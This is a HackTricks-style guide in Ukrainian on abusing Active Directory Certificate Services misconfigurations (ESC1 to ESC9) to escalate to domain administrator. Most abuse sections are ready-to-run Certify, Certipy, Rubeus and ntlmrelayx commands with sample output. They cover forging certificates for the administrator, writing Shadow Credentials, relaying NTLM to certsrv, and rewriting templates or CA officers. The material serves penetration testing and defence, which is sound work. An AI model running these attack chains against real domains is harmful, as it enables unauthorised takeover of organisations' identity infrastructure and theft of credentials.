# AD CS Ескалація у домені

{{#include ../../../banners/hacktricks-training.md}}


**Це резюме секцій щодо технік ескалації з постів:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA надає права реєстрації низькоправним користувачам.**
- **Не потрібне затвердження менеджера.**
- **Не потрібні підписи авторизованого персоналу.**
- **Дескриптори безпеки на шаблонах сертифікатів надто ліберальні, дозволяючи низькоправним користувачам отримувати права реєстрації.**
- **Шаблони сертифікатів налаштовані для визначення EKU, що полегшують аутентифікацію:**
- Ідентифікатори Extended Key Usage (EKU), такі як Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), або відсутність EKU (SubCA), можуть бути включені.
- **Шаблон дозволяє запитувачам включати subjectAltName у Certificate Signing Request (CSR):**
- Active Directory (AD) віддає пріоритет subjectAltName (SAN) у сертифікаті для перевірки ідентичності, якщо він присутній. Це означає, що вказавши SAN у CSR, можна запросити сертифікат для видавання себе за будь-якого користувача (наприклад, domain administrator). Можливість вказувати SAN запитувачем визначається в об'єкті шаблону сертифіката в AD через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапорця `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Конфігурація, описана вище, дозволяє низькоправним користувачам запитувати сертифікати з будь-яким обраним SAN, що дає змогу автентифікуватись від імені будь-якого доменного об'єкта через Kerberos або SChannel.

Цю опцію іноді ввімкнюють для підтримки динамічної генерації HTTPS або host сертифікатів продуктами чи службами деплойменту, або через незнання.

Зауважте, що створення сертифіката з цією опцією викликає попередження, чого не відбувається, коли існуючий шаблон сертифіката (наприклад, шаблон `WebServer`, який має увімкнений `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють і потім модифікують, додавши OID для аутентифікації.

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, ви можете виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловживати цією вразливістю та видавати себе за адміністратора**, можна запустити:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** і знову використовувати його для **аутентифікації за допомогою Rubeus або certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
The Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелічення шаблонів сертифікатів у схемі конфігурації AD Forest, зокрема тих, що не потребують погодження або підписів, мають Client Authentication або Smart Card Logon EKU, і з увімкненим прапором `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати, запустивши наступний LDAP-запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Права на реєстрацію (enrollment) надаються користувачам з низькими привілеями Enterprise CA.
2. Вимога схвалення керівника вимкнена.
3. Відсутня потреба в авторизованих підписах.
4. Надмірно ліберальний дескриптор безпеки шаблону сертифіката надає права на реєстрацію сертифікатів користувачам з низькими привілеями.
5. **Шаблон сертифіката визначено так, щоб містити Any Purpose EKU або взагалі не містити EKU.**

The **Any Purpose EKU** дозволяє зловмиснику отримати сертифікат для **будь-якої мети**, включно з автентифікацією клієнта, автентифікацією сервера, code signing тощо. Та сама **technique used for ESC3** може бути використана для експлуатації цього сценарію.

Сертифікати з **no EKUs**, які виступають як subordinate CA certificates, можуть бути використані для **будь-якої мети** і **також можуть бути використані для підпису нових сертифікатів**. Отже, зловмисник може вказати довільні EKU або поля в нових сертифікатах, використовуючи subordinate CA certificate.

Однак нові сертифікати, створені для **domain authentication**, не працюватимуть, якщо subordinate CA не довіряється об’єктом **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Тим не менш, зловмисник усе одно може створити **нові сертифікати з будь-яким EKU** та довільними значеннями сертифікатів. Це може бути потенційно **зловживано** для широкого кола цілей (наприклад, code signing, server authentication тощо) і може мати значні наслідки для інших додатків у мережі, таких як SAML, AD FS або IPSec.

Щоб перелічити шаблони, що відповідають цьому сценарію в конфігураційній схемі AD Forest, можна виконати такий LDAP-запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони Enrolment Agent - ESC3

### Пояснення

Цей сценарій схожий на перший та другий, але **abusing** іншу **EKU** (Certificate Request Agent) та **2 різні шаблони** (тому має 2 набори вимог),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), відомий як **Enrollment Agent** в документації Microsoft, дозволяє сутності **enroll** для **сертифікату** від **імені іншого користувача**.

The **“enrollment agent”** реєструється в такому **шаблоні** і використовує отриманий **сертифікат для спільного підпису CSR від імені іншого користувача**. Далі він **надсилає** цей **спільно підписаний CSR** до CA, реєструючись у **шаблоні**, який **дозволяє “enroll on behalf of”**, і CA відповідає сертифікатом, що належить “іншому” користувачу.

**Requirements 1:**

- Права на реєстрацію (enrollment rights) надаються низькоправовим користувачам Enterprise CA.
- Вимога затвердження менеджером опущена.
- Відсутня вимога авторизованих підписів.
- Дескриптор безпеки шаблону сертифіката надмірно дозволяє, надаючи права на реєстрацію низькоправовим користувачам.
- Шаблон сертифіката включає Certificate Request Agent EKU, що дозволяє запитувати інші шаблони сертифікатів від імені інших суб'єктів.

**Requirements 2:**

- Enterprise CA надає права на реєстрацію низькоправовим користувачам.
- Затвердження менеджера обходиться.
- Схема версії шаблону або 1, або перевищує 2, і вона вказує Application Policy Issuance Requirement, що вимагає Certificate Request Agent EKU.
- EKU, визначена в шаблоні сертифіката, дозволяє аутентифікацію в домені.
- Обмеження для enrollment agents не застосовуються на CA.

### Зловживання

Ви можете використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy) для зловживання цим сценарієм:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Користувачі, які дозволені для отримання **enrollment agent certificate**, шаблони, у яких **agents** мають право реєструватися, та **accounts**, від імені яких агент реєстрації може діяти, можуть бути обмежені корпоративними CA. Це досягається відкривши `certsrc.msc` **snap-in**, **клацнувши правою кнопкою миші по CA**, **натиснувши Properties**, а потім **перейшовши на вкладку “Enrollment Agents”**.

Проте зауважено, що **налаштування за замовчуванням** для CA — “Do not restrict enrollment agents.” Коли адміністратори вмикають обмеження для агентів реєстрації, встановлюючи “Restrict enrollment agents”, конфігурація за замовчуванням залишається надзвичайно дозволяючою. Вона дозволяє **Everyone** доступ реєструватися у всіх шаблонах як будь-хто.

## Уразливий контроль доступу до шаблонів сертифікатів - ESC4

### **Пояснення**

**Дескриптор безпеки** на **шаблонах сертифікатів** визначає **повноваження**, якими володіють певні **принципали AD** щодо шаблону.

Якщо **атакуючий** має необхідні **права** для **зміни** шаблону та **впровадження** будь-яких **експлуатованих неправильних налаштувань**, описаних у попередніх розділах, це може сприяти підвищенню привілеїв.

Важливі права, що застосовуються до шаблонів сертифікатів, включають:

- **Owner:** Надає неявний контроль над об’єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Дозволяє повну владу над об’єктом, включно з можливістю змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на принципала під контролем атакуючого.
- **WriteDacl:** Дозволяє коригувати контролі доступу, потенційно надаючи атакуючому FullControl.
- **WriteProperty:** Авторизує редагування будь-яких властивостей об’єкта.

### Зловживання

Щоб ідентифікувати принципалів з правами редагування шаблонів та інших PKI-об’єктів, перелікуйте їх за допомогою Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Приклад privesc, подібного до попереднього:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 має місце, коли користувач має права запису над шаблоном сертифіката. Це, наприклад, може бути використано для перезапису конфігурації шаблону сертифіката з метою зробити шаблон вразливим до ESC1.

Як видно з шляху вище, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` має новий зв'язок `AddKeyCredentialLink` з `JOHNPC`. Оскільки ця техніка пов'язана з сертифікатами, я також реалізував цю атаку, яка відома як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Нижче — невеликий приклад використання команди Certipy `shadow auto` для отримання NT hash жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. За **замовчуванням**, Certipy **перезаписує** конфігурацію, щоб зробити її **вразливою до ESC1**. Ми також можемо вказати **`-save-old` параметр для збереження старої конфігурації**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Пояснення

Широка мережа взаємопов’язаних стосунків на основі ACL, яка включає кілька об’єктів за межами certificate templates та certificate authority, може вплинути на безпеку всієї системи AD CS. Ці об’єкти, що можуть суттєво вплинути на безпеку, включають:

- Об'єкт комп'ютера AD сервера CA, який може бути скомпрометований через механізми на кшталт S4U2Self або S4U2Proxy.
- RPC/DCOM сервер CA-сервера.
- Будь-який дочірній AD-об'єкт або контейнер у межах конкретного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, але не обмежується, контейнерами та об'єктами такими як the Certificate Templates container, the Certification Authorities container, the NTAuthCertificates object та the Enrollment Services Container.

Безпека PKI-системи може бути підірвана, якщо атакуючий з низькими привілеями отримає контроль над будь-яким із цих критичних компонентів.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, розглянута в [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage), також торкається наслідків прапора **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, як це окреслено Microsoft. Ця конфігурація, коли вона активована на Certification Authority (CA), дозволяє включати **значення, визначені користувачем** у **subject alternative name** для **будь-якого запиту**, включно з тими, що формуються з Active Directory®. Відповідно, це дозволяє **зловмиснику** зареєструватися через **будь-який шаблон**, налаштований для доменної **authentication** — зокрема ті, що відкриті для реєстрації **unprivileged** користувачами, як-от стандартний User template. У результаті може бути отримано сертифікат, який дає змогу зловмиснику автентифікуватися як domain administrator або **будь-яка інша активна сутність** в домені.

**Примітка**: Підхід для додавання **alternative names** в Certificate Signing Request (CSR) через аргумент `-attrib "SAN:"` в `certreq.exe` (що називають “Name Value Pairs”) відрізняється від стратегії експлуатації SAN у ESC1. Тут різниця полягає в тому, **як інформація про обліковий запис інкапсулюється** — у атрибуті сертифіката, а не в розширенні.

### Зловживання

Щоб перевірити, чи налаштування активовано, організації можуть виконати наступну команду за допомогою `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція фактично використовує **remote registry access**, отже альтернативний підхід може бути таким:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Інструменти на кшталт [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy) здатні виявляти цю некоректну конфігурацію та експлуатувати її:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, за умови, що особа володіє правами **domain administrative** або еквівалентними, наступну команду можна виконати з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, цей flag можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після оновлень безпеки May 2022 новостворені **сертифікати** міститимуть **розширення безпеки**, яке включає **властивість `objectSid` запитувача**. Для ESC1 цей SID походить від вказаного SAN. Однак для **ESC6** SID віддзеркалює **`objectSid` запитувача**, а не SAN.\
> Щоб експлуатувати ESC6, система має бути вразливою до ESC10 (Weak Certificate Mappings), який віддає пріоритет **SAN над новим розширенням безпеки**.

## Уразливий контроль доступу сертифікаційного центру (CA) - ESC7

### Атака 1

#### Пояснення

Контроль доступу до сертифікаційного центру реалізується через набір дозволів, які регулюють дії CA. Ці дозволи можна переглянути, запустивши `certsrv.msc`, клацнувши правою кнопкою миші по CA, вибравши Properties, а потім перейшовши на вкладку Security. Крім того, дозволи можна перелічити за допомогою модуля PSPKI командами, наприклад:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це дає уявлення про основні права, а саме **`ManageCA`** та **`ManageCertificates`**, що відповідають ролям “адміністратор CA” та “менеджер сертифікатів” відповідно.

#### Abuse

Наявність прав **`ManageCA`** на сертифікаційному органі дозволяє суб'єкту змінювати налаштування віддалено за допомогою PSPKI. Це включає переключення прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`** для дозволу вказування SAN у будь-якому шаблоні, що є критичною умовою для ескалації в домені.

Спростити цей процес можна за допомогою PSPKI’s **Enable-PolicyModuleFlag** cmdlet, що дозволяє вносити зміни без прямої взаємодії з GUI.

Наявність прав **`ManageCertificates`** полегшує схвалення очікуваних запитів, фактично обходячи захист "CA certificate manager approval".

Комбінацію модулів **Certify** та **PSPKI** можна використати для запиту, схвалення та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** **`Manage CA`** дозволи були використані, щоб **увімкнути** прапорець **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання **ESC6 атаки**, але це не матиме жодного ефекту, доки служба CA (`CertSvc`) не буде перезапущена. Коли користувач має право доступу `Manage CA`, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, E**SC6 може не працювати out of the box** у більшості запатчених середовищ через оновлення безпеки травня 2022 року.

Отже, тут представлено іншу атаку.

Передумови:

- Тільки **`ManageCA` дозвіл**
- **`Manage Certificates`** дозвіл (може бути надано з **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнений** (може бути увімкнений з **`ManageCA`**)

Техніка базується на тому, що користувачі з правом доступу `Manage CA` _та_ `Manage Certificates` можуть **ініціювати невдалі запити на сертифікат**. Шаблон сертифіката **`SubCA`** є **вразливим до ESC1**, але **лише адміністратори** можуть зареєструватися у цьому шаблоні. Отже, **користувач** може **запитати** реєстрацію у **`SubCA`** — яка буде **відхилена** — але **потім буде видана менеджером**.

#### Зловживання

Ви можете **наділити себе правом `Manage Certificates`** додавши свого користувача як нового офіцера.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали передумови для цієї атаки, ми можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**Цей запит буде відмовле**но, але ми збережемо private key і запишемо request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
З нашими **`Manage CA` and `Manage Certificates`**, ми можемо потім **випустити сертифікат для невдалого запиту** за допомогою команди `ca` та параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Атака 3 – Зловживання розширеннями Manage Certificates (SetExtension)

#### Пояснення

На додаток до класичних зловживань ESC7 (включаючи увімкнення EDITF атрибутів або затвердження очікуючих запитів), **Certify 2.0** відкрив новий примітив, який потребує лише роль *Manage Certificates* (теж відома як **Certificate Manager / Officer**) на Enterprise CA.

RPC-метод `ICertAdmin::SetExtension` може бути виконаний будь-яким суб'єктом, що має *Manage Certificates*. Хоча метод традиційно використовувався легітимними CA для оновлення розширень у **pending** запитах, нападник може зловживати ним, щоб **додати *нестандартне* розширення сертифіката** (наприклад користувацький OID *Certificate Issuance Policy* типу `1.1.1.1`) до запиту, який чекає на затвердження.

Оскільки цільовий template **не визначає значення за замовчуванням для цього розширення**, CA НЕ перезапише контрольоване атакуючим значення, коли запит буде виданий. В результаті сертифікат містить розширення, обране атакуючим, яке може:

* Відповідати вимогам Application / Issuance Policy інших вразливих templates (що призводить до ескалації привілеїв).
* Інжектувати додаткові EKU або політики, що надають сертифікату несподівану довіру в сторонніх системах.

Коротко, *Manage Certificates* — раніше вважалася «менш потужною» частиною ESC7 — тепер може бути використана для повної ескалації привілеїв або довготривалого персисту, без зміни конфігурації CA або потреби у більш обмежливому праві *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Надішліть certificate request, який залишиться *pending*.** Це можна забезпечити template, що вимагає затвердження менеджером:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Додайте користувацьке розширення до pending запиту** з використанням нової команди `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Якщо template ще не визначає розширення *Certificate Issuance Policies*, наведене вище значення буде збережено після видачі.*

3. **Видайте запит** (якщо ваша роль також має права схвалення *Manage Certificates*) або дочекайтеся, поки оператор його затвердить. Після видачі завантажте сертифікат:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Отриманий сертифікат тепер містить зловмисний OID issuance-policy і може бути використаний у подальших атаках (наприклад ESC13, ескалація домену тощо).

> NOTE:  Ту ж атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` та параметр `-set-extension`.

## NTLM relay до HTTP кінцевих точок AD CS – ESC8

### Пояснення

> [!TIP]
> В середовищах, де **AD CS встановлено**, якщо існує вразлива **web enrollment endpoint** і принаймні один **certificate template опублікований**, який дозволяє **domain computer enrollment та client authentication** (наприклад дефолтний **`Machine`** template), стає можливим, що **будь-який комп’ютер із активною spooler service може бути скомпрометований атакуючим**!

AD CS підтримує кілька **HTTP-based enrollment methods**, доступних через додаткові серверні ролі, які адміністратори можуть інсталювати. Ці інтерфейси для HTTP-реєстрації сертифікатів вразливі до **NTLM relay attacks**. Нападник з **компрометованої машини** може сімітувати будь-який AD акаунт, який автентифікується через вхідний NTLM. Імітуючи жертву, нападник може звертатися до цих веб-інтерфейсів, щоб **запитати клієнтський certificate для client authentication, використовуючи `User` або `Machine` templates**.

- **Web enrollment interface** (старіший ASP-додаток, доступний за `http://<caserver>/certsrv/`) за замовчуванням працює лише через HTTP, що не захищає від NTLM relay attacks. Додатково, він явно дозволяє лише NTLM аутентифікацію через Authorization HTTP header, роблячи більш безпечні методи автентифікації, як Kerberos, непридатними.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service та **Network Device Enrollment Service** (NDES) за замовчуванням підтримують negotiate аутентифікацію через Authorization HTTP header. Negotiate аутентифікація **підтримує і** Kerberos, і **NTLM**, що дозволяє нападнику **понизити** автентифікацію до NTLM під час relay-атак. Хоча ці веб-сервіси за замовчуванням дозволяють HTTPS, сам по собі HTTPS **не захищає від NTLM relay attacks**. Захист від NTLM relay для HTTPS сервісів можливий лише коли HTTPS комбінується з channel binding. На жаль, AD CS не включає Extended Protection for Authentication на IIS, що потрібно для channel binding.

Поширеною **проблемою** NTLM relay атак є **коротка тривалість NTLM сесій** та неможливість нападника взаємодіяти з сервісами, які **вимагають NTLM signing**.

Однак це обмеження долається використанням NTLM relay для отримання сертифіката для користувача, оскільки строк дії сертифіката визначає тривалість сесії, і сертифікат можна використовувати з сервісами, які **вимагають NTLM signing**. Інструкції щодо використання вкраденого сертифіката див. у:

{{#ref}}
account-persistence.md
{{#endref}}

Інше обмеження NTLM relay атак — це те, що **машина, контрольована нападником, має бути автентифікована акаунтом жертви**. Нападник може або чекати, або намагатися **спричинити** таку автентифікацію:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перераховує **увімкнені HTTP кінцеві точки AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними Certificate Authorities (CAs) для збереження кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна розпарсити та перелічити, використовуючи інструмент **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

Запит сертифіката за замовчуванням виконується Certipy на основі шаблону `Machine` або `User`, що визначається тим, чи закінчується ім'я облікового запису, яке ретранслюється, символом `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Можна використати техніку, таку як [PetitPotam](https://github.com/ly4k/PetitPotam), щоб примусити автентифікацію. При роботі з контролерами домену потрібно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Немає розширення безпеки - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, забороняє вбудовування **нового розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`** у сертифікат. Цей прапорець набуває значення, коли `StrongCertificateBindingEnforcement` встановлено в `1` (налаштування за замовчуванням), на відміну від значення `2`. Його важливість зростає в сценаріях, де може бути використане слабше відображення сертифіката для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінює вимог.

Умови, за яких налаштування цього прапорця стає істотним, включають:

- `StrongCertificateBindingEnforcement` не встановлено в `2` (за замовчуванням — `1`), або `CertificateMappingMethods` містить прапорець `UPN`.
- Сертифікат позначено прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- Сертифікат містить будь-який EKU для автентифікації клієнта.
- Над будь-яким обліковим записом доступні права `GenericWrite`, що дозволяє скомпрометувати інший.

### Сценарій зловживання

Припустимо, `John@corp.local` має права `GenericWrite` над `Jane@corp.local` з метою скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, на який `Jane@corp.local` має право здійснити реєстрацію (enroll), налаштований з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.

Спочатку hash `Jane` отримується за допомогою Shadow Credentials завдяки `GenericWrite`, якими володіє `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Після цього `userPrincipalName` користувача `Jane` змінено на `Administrator`, навмисно опустивши частину домену `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається відмінним значенням для `Administrator`'s `userPrincipalName`.

Після цього шаблон сертифіката `ESC9`, позначений як вразливий, запитується від імені `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
